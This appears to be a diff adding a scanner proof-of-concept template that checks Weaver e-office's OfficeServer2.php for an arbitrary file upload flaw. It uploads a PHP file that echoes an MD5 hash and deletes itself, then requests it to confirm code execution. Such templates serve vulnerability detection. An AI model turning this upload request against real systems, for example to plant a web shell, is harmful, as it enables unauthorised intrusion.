@@ -1,0 +1,50 @@
+id: poc-yaml-weaver-e-office-officeserver2-php-anyfile-upload
+info:
+  name: 泛微OA e-office OfficeServer2.php 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+http:
+  - raw:
+      - |
+        POST /iWebOffice/OfficeServer2.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
+
+        ------WebKitFormBoundarySIELKZKzD7vQmdsO
+        Content-Disposition: form-data; name="FILENAME"
+
+        {{t1}}.php
+        ------WebKitFormBoundarySIELKZKzD7vQmdsO
+        Content-Disposition: form-data; name="OPTION"
+
+        SAVEFILE
+        ------WebKitFormBoundarySIELKZKzD7vQmdsO
+        Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"
+
+        <?=md5({{t1}});unlink(__FILE__);
+        ------WebKitFormBoundarySIELKZKzD7vQmdsO--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "VERSION"
+          - "BODYSIZE"
+  - raw:
+      - |
+        GET /attachment/{{t1}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+variables:
+  t1: "{{rand_int(1000,9999)}}"
+  t2: "{{md5(t1)}}"
